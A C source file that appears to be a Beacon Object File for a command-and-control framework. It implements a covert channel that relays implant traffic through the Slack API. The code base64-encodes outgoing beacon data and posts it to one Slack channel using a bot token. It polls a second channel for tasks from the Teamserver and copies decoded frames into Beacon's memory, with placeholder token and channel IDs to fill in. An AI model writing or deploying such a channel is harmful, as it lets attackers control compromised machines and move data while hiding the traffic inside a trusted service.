#include "common.h"

#pragma comment(lib, "wininet.lib")

extern "C" {

#ifndef _DEBUG
    NTSYSAPI ULONG RtlRandomEx(PULONG Seed);
#else
    typedef ULONG(NTSYSAPI* RtlRandomExPtr)(PULONG);
#endif
    // WinInet DFRs
    DFR(WININET, InternetOpenA);
    DFR(WININET, InternetConnectA);
    DFR(WININET, HttpOpenRequestA);
    DFR(WININET, HttpSendRequestA);
    DFR(WININET, InternetReadFile);
    DFR(WININET, InternetCloseHandle);

    // Keep Kernel32 DFRs
    DFR(KERNEL32, HeapAlloc);
    DFR(KERNEL32, GetProcessHeap);
    DFR(KERNEL32, HeapFree);
    DFR(KERNEL32, Sleep);

    // Map them to the internal macro names
#define InternetOpenA        WININET$InternetOpenA
#define InternetConnectA     WININET$InternetConnectA
#define HttpOpenRequestA     WININET$HttpOpenRequestA
#define HttpSendRequestA     WININET$HttpSendRequestA
#define InternetReadFile     WININET$InternetReadFile
#define InternetCloseHandle  WININET$InternetCloseHandle

#define HeapAlloc            KERNEL32$HeapAlloc
#define GetProcessHeap       KERNEL32$GetProcessHeap
#define HeapFree             KERNEL32$HeapFree
#define Sleep                KERNEL32$Sleep

    /**
     * @brief Safe heap allocation
     * @param ptr Pointer to store the allocated memory address
     * @param size Size of memory to allocate in bytes
     * @return UDC2_SUCCESS on successful allocation, UDC2_ERROR_INVALID_PARAM on invalid parameters, UDC2_ERROR_MEMORY_ALLOC on allocation failure
     */
    static int safeHeapAlloc(void** ptr, SIZE_T size) {
        if (!ptr || size == 0) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        *ptr = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
        if (!*ptr) {
            return UDC2_ERROR_MEMORY_ALLOC;
        }

        return UDC2_SUCCESS;
    }

    /**
     * @brief Safe heap deallocation
     * @param ptr Pointer to the memory address to deallocate
     */
    static void safeHeapFree(void** ptr) {
        if (ptr && *ptr) {
            HeapFree(GetProcessHeap(), 0, *ptr);
            *ptr = NULL;
        }
    }

    // This function belongs to utils.h, but placed it here since it uses safeHeapAlloc()
    int Base64Encode(const unsigned char* in, int in_len, char** out) {
        int out_len = 4 * ((in_len + 2) / 3);
        void* tempOut = NULL;

        if (safeHeapAlloc(&tempOut, out_len + 1) != 0) return -1;
        char* p = (char*)tempOut;

        for (int i = 0; i < in_len; i += 3) {
            int v = in[i];
            v = i + 1 < in_len ? v << 8 | in[i + 1] : v << 8;
            v = i + 2 < in_len ? v << 8 | in[i + 2] : v << 8;

            p[0] = base64_table[(v >> 18) & 0x3F];
            p[1] = base64_table[(v >> 12) & 0x3F];
            if (i + 1 < in_len) p[2] = base64_table[(v >> 6) & 0x3F];
            else p[2] = '=';
            if (i + 2 < in_len) p[3] = base64_table[v & 0x3F];
            else p[3] = '=';
            p += 4;
        }
        *p = '\0';
        *out = (char*)tempOut;
        return out_len;
    }

    // Helper to extract JSON values (primitive)
    void ExtractJsonValue(const char* json, const char* key, char* output, int maxLen) {
        char searchKey[128];
        snprintf(searchKey, sizeof(searchKey), "\"%s\":\"", key);
        char* start = strstr((char*)json, searchKey);
        if (start) {
            start += strlen(searchKey);
            char* end = strchr(start, '\"');
            if (end) {
                int len = (int)(end - start);
                if (len >= maxLen) len = maxLen - 1;
                strncpy(output, start, len);
                output[len] = '\0';
            }
        }
    }

    // --- UDC2 COMPLIANT SEND/RECEIVE ---

    int sendSlackPackets(const char* data, int len) {
        if (!gUdc2State.initialized || !data) return -1;

        // 1. Base64 Encode the binary sendBuf
        char* b64Data = NULL;
        int b64Len = Base64Encode((const unsigned char*)data, len, &b64Data);
        if (b64Len < 0) return -1;

        // 2. Prepare WinInet handles
        HINTERNET hS = InternetOpenA("SlackSender", 1, NULL, NULL, 0);
        HINTERNET hC = InternetConnectA(hS, "slack.com", 443, NULL, NULL, 3, 0, 0);
        HINTERNET hR = HttpOpenRequestA(hC, "POST", "/api/chat.postMessage", NULL, NULL, NULL, 0x00800000, 0);

        char hds[512];
        snprintf(hds, sizeof(hds), "Content-Type: application/json\r\nAuthorization: Bearer %s\r\n", gUdc2State.botToken);

        // 3. Allocate payload buffer on heap (Base64 + JSON overhead)
        void* payPtr = NULL;
        int paySize = b64Len + 512;
        int result = -1;

        if (safeHeapAlloc(&payPtr, paySize) == 0) {
            char* pay = (char*)payPtr;
            // Build JSON with the Base64 string
            snprintf(pay, paySize, "{\"channel\": \"%s\", \"text\": \"%s\"}", gUdc2State.clientchannelId, b64Data);

            BOOL success = HttpSendRequestA(hR, hds, (DWORD)strlen(hds), (LPVOID)pay, (DWORD)strlen(pay));
            if (success) result = 0;

            safeHeapFree(&payPtr);
        }

        // 4. Cleanup
        void* b64Ptr = (void*)b64Data;
        safeHeapFree(&b64Ptr);

        InternetCloseHandle(hR);
        InternetCloseHandle(hC);
        InternetCloseHandle(hS);

        return result;
    }

    int recvReplySlack(char* read, int readLen) {
        HINTERNET hS = NULL, hC = NULL, hR = NULL;
        int finalBytesCopied = -1; // Default to failure as per description
        int result = UDC2_SUCCESS;

        // 1. Initial Validation (Matches UDC2 requirements)
        if (!gUdc2State.initialized || !read || readLen <= 0) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        // 2. WinInet Connection Setup
        hS = InternetOpenA("SlackReader", 1, NULL, NULL, 0);
        if (!hS) return -1;

        hC = InternetConnectA(hS, "slack.com", 443, NULL, NULL, 3, 0, 0);
        if (!hC) {
            InternetCloseHandle(hS);
            return -1;
        }

        char path[512];
        snprintf(path, 512, "/api/conversations.history?channel=%s&limit=1", gUdc2State.serverchannelId);

        hR = HttpOpenRequestA(hC, "GET", path, NULL, NULL, NULL, 0x00800000, 0); // INTERNET_FLAG_SECURE
        if (!hR) {
            InternetCloseHandle(hC);
            InternetCloseHandle(hS);
            return -1;
        }

        char hds[512];
        snprintf(hds, 512, "Authorization: Bearer %s\r\n", gUdc2State.botToken);

        // 3. Send Request and Process Response
        if (HttpSendRequestA(hR, hds, (DWORD)strlen(hds), NULL, 0)) {
            void* respPtr = NULL;
            // Allocate heap for raw JSON (avoiding stack bloat/__chkstk)
            if (safeHeapAlloc(&respPtr, 16384) == 0) {
                char* resp = (char*)respPtr;
                DWORD dwRead = 0;

                if (InternetReadFile(hR, resp, 16383, &dwRead) && dwRead > 0) {
                    void* b64Ptr = NULL;
                    // Allocate heap for Base64 string extraction
                    if (safeHeapAlloc(&b64Ptr, 8192) == 0) {
                        char* b64Buffer = (char*)b64Ptr;

                        ExtractJsonValue(resp, "text", b64Buffer, 8192);

                        if (strlen(b64Buffer) > 0) {
                            void* decodedRaw = NULL;
                            // Allocate heap for temporary binary storage
                            if (safeHeapAlloc(&decodedRaw, 8192) == 0) {

                                int decodedLen = Base64Decode(b64Buffer, (unsigned char*)decodedRaw, 8192);

                                // 4. UDC2 Header Logic Integration
                                // Data must be at least 4 bytes to contain the frameLen prefix
                                if (decodedLen >= (int)sizeof(int)) {
                                    // Extract frame length from the first 4 bytes
                                    int frameLen = *(int*)decodedRaw;

                                    // Total frame size includes the 4-byte length field itself
                                    int totalFrameSize = frameLen + (int)sizeof(int);

                                    // Validation: ensure frame doesn't exceed buffer or decoded size
                                    if (totalFrameSize > 0 && totalFrameSize <= readLen && totalFrameSize <= decodedLen) {
                                        // Copy validated frame to Beacon's memory
                                        result = secureMemCopy(read, readLen, (char*)decodedRaw, totalFrameSize);

                                        if (result == UDC2_SUCCESS) {
                                            finalBytesCopied = totalFrameSize;
                                        }
                                        else {
                                            finalBytesCopied = result; // Return UDC2_ERROR_ codes
                                        }
                                    }
                                    else {
                                        finalBytesCopied = UDC2_ERROR_INVALID_PARAM;
                                    }
                                }
                                else {
                                    finalBytesCopied = UDC2_ERROR_PROTOCOL;
                                }
                                safeHeapFree(&decodedRaw);
                            }
                        }
                        safeHeapFree(&b64Ptr);
                    }
                }
                safeHeapFree(&respPtr);
            }
        }

        // 5. Cleanup Handles
        InternetCloseHandle(hR);
        InternetCloseHandle(hC);
        InternetCloseHandle(hS);

        return finalBytesCopied;
    }

    int udc2Proxy(const char* sendBuf, int sendBufLen, char* recvBuf, int recvBufMaxLen) {
        // 1. Send outgoing data to Slack
        int result = sendSlackPackets(sendBuf, sendBufLen);
        if (result != UDC2_SUCCESS) return result;

        // 2. Small delay to let the Teamserver send the new task
        Sleep(3000);

        // 3. Retrieve response from Slack
        return recvReplySlack(recvBuf, recvBufMaxLen);
    }

    /**
     * @brief Called by beacon when closing the UDC2 channel. This should be used for any cleanup
     * you may need to perform.
     */
    void udc2Close() {
        if (gUdc2State.initialized) {
            gUdc2State.initialized = FALSE;
        }
    }

    /**
     * @brief Initializes global state
     * @return UDC2_SUCCESS on successful initialization, UDC2_ERROR codes on failure
     */
    int init() {
        gUdc2State.botToken = "xoxb-TOKEN-HERE"; // SET THIS TO YOUR BOT TOKEN
        gUdc2State.clientchannelId = "CLIENT-CHANNEL-TOKEN-HERE"; // SET THIS TO YOUR SLACK CLIENT CHANNEL ID
        gUdc2State.serverchannelId = "SERVER-CHANNEL-TOKEN-HERE"; // SET THIS TO YOUR SLACK SERVER CHANNEL ID
        gUdc2State.initialized = TRUE;
        return UDC2_SUCCESS;
    }

    void go(char* args, int len) {
        PUDC2_INFO info;
        
        int result;

        if (!args) 
            return;

        info = (PUDC2_INFO)args;

        // Initialize our Slack BOF
        result = init();
        if (result != UDC2_SUCCESS) 
            return;

        // Set function pointers
        info->proxyCall = udc2Proxy;
        info->proxyClose = udc2Close;
    }
}
